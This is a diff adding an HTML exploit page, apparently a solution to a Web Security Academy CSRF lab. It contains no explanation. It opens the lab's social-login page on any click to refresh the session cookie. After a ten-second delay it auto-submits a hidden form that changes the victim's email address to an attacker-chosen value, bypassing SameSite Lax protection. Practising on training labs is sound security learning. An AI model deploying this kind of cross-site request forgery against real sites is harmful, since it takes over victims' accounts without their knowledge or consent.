@@ -1,0 +1,15 @@
+<script>
+    window.onclick = () => {
+        window.open("https://0a1900b604b2471e850014e300de0087.web-security-academy.net/social-login")
+    }
+
+</script>
+<form action="https://0a1900b604b2471e850014e300de0087.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="email" name="email" hidden value="vuln@pwned.com">
+</form>
+<script>
+    const submitForm = () => {
+        document.forms[0].submit()
+    }
+    setTimeout(submitForm, 10000)
+</script>
